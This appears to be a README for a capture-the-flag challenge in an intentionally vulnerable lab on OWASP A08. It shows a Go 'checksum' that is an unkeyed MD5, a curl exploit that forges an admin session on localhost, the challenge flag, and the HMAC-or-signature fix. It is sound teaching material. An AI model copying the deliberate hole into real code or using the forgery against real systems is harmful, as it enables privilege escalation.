# A08: Software and Data Integrity Failures

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

A "session restore" feature: send back a base64 blob and a checksum, and the
app restores your session from it — supposedly proving the blob came from
the server.

**Play it in the browser** — open http://localhost:9008. Type `{"role":"admin"}`,
click "Base64 encode" to get the exact string to hash, compute its MD5
yourself (any online tool, or `md5`/`md5sum` in a terminal), paste it into
the checksum field, and submit.

## The bug

```go
// BUG: this "checksum" is an unkeyed hash of attacker-controlled data. It
// proves the data wasn't corrupted in transit — it proves nothing about who
// produced it.
func computeChecksum(data string) string {
    sum := md5.Sum([]byte(data))
    return hex.EncodeToString(sum[:])
}
```

The "integrity check" is just `MD5(data)` — no secret key, no signature.
Anyone can compute a matching checksum for any data they invent, so the
server ends up trusting whatever the client claims about its own session.

## Exploit

```bash
DATA=$(printf '{"role":"admin"}' | base64)
CHECKSUM=$(printf '%s' "$DATA" | md5sum | cut -d' ' -f1)   # or `md5` on macOS

curl -s -X POST http://localhost:9008/api/session/restore \
  -d "{\"data\":\"$DATA\",\"checksum\":\"$CHECKSUM\"}"
```

## Flag

`CTF{a08_1ns3cur3_d3s3r14l1z4t10n}`

## The fix (for reference)

Integrity checks need a secret the client doesn't have: an HMAC with a
server-side key, or a digital signature verified against a trusted public
key. A hash alone — keyed or not — that the client can also compute proves
nothing about authenticity.
